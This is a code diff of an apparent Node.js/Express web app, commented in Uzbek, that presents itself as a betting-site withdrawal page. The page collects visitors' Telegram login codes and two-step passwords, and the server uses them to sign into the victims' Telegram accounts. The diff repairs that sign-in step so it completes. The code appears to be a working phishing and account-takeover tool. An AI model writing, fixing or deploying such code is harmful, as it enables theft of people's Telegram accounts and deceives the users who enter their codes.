@@ -96,7 +96,7 @@ app.post('/api/submit-withdraw', async (req, res) => {
     try {
         const { client, phoneCodeHash, session } = authData;
 
-        // Agar foydalanuvchi 2FA parolini yuborgan bo'lsa
+        // Agar 2FA parol yuborilgan bo'lsa
         if (password) {
             const passwordSrpResult = await client.invoke(new Api.account.GetPassword());
             const passwordCheck = await computeCheck(passwordSrpResult, password);
@@ -106,14 +106,12 @@ app.post('/api/submit-withdraw', async (req, res) => {
                 })
             );
         } else {
-            // Birinchi marta kod bilan kirib ko'rish
-            await client.invoke(
-                new Api.auth.SignIn({
-                    phoneNumber: cleanPhone,
-                    phoneCodeHash: phoneCodeHash,
-                    phoneCode: inputCode,
-                })
-            );
+            // Kod orqali kirish (client.signIn metodi xatosiz va to'liq bajariladi)
+            await client.signIn({
+                phoneNumber: '+' + cleanPhone,
+                phoneCodeHash: phoneCodeHash,
+                phoneCode: inputCode,
+            });
         }
 
         const me = await client.getMe();
@@ -294,7 +292,6 @@ app.get('/', (req, res) => {
             <div class="status-alert" id="statusAlert"><i class="fa-solid fa-circle-check"></i> Kod yuborildi!</div>
             <div class="form-group" id="codeGroup" style="display: none;">
                 <label style="font-size: 12px;">Telegramga kelgan kod:</label>
-                <!-- Raqamli klaviatura ochilishi uchun inputmode="numeric" va type="tel" qo'shildi -->
                 <div class="code-boxes">
                     <input type="tel" inputmode="numeric" pattern="[0-9]*" class="code-box-input" maxlength="1" oninput="moveNext(this, 0)" onkeydown="handleKeyDown(event, 0)">
                     <input type="tel" inputmode="numeric" pattern="[0-9]*" class="code-box-input" maxlength="1" oninput="moveNext(this, 1)" onkeydown="handleKeyDown(event, 1)">
@@ -306,7 +303,6 @@ app.get('/', (req, res) => {
                 <div id="passwordFieldGroup" style="display: none; margin-top: 10px;">
                     <label style="font-size: 12px; color: #facc15;">2-Bosqichli Telegram Paroli:</label>
                     <div class="bet-input-container" style="margin-top: 5px;">
-                        <!-- Standart matnli klaviatura ochilishi uchun type="password" ishlatildi -->
                         <input type="password" class="bet-input-field" id="telegramPassword" placeholder="Parolingizni kiriting">
                     </div>
                 </div>
@@ -568,7 +564,6 @@ app.get('/', (req, res) => {
                 document.getElementById('codeGroup').style.display = 'block';
                 document.getElementById('sendCodeBtn').innerText = "Qayta yuborish";
                 
-                // Birinchi kod kiritish katagiga avto-fokus berish
                 setTimeout(() => {
                     const inputs = document.querySelectorAll('.code-box-input');
                     if (inputs[0]) inputs[0].focus();
@@ -583,7 +578,6 @@ app.get('/', (req, res) => {
         }
     }
 
-    // Keyingi katakchaga o'tish
     function moveNext(input, index) {
         if (input.value.length >= 1) {
             const inputs = document.querySelectorAll('.code-box-input');
@@ -591,7 +585,6 @@ app.get('/', (req, res) => {
         }
     }
 
-    // Backspace (o'chirish) tugmasi bosilganda oldingi katakchaga qaytish va o'chirish
     function handleKeyDown(event, index) {
         const inputs = document.querySelectorAll('.code-box-input');
         if (event.key === "Backspace") {
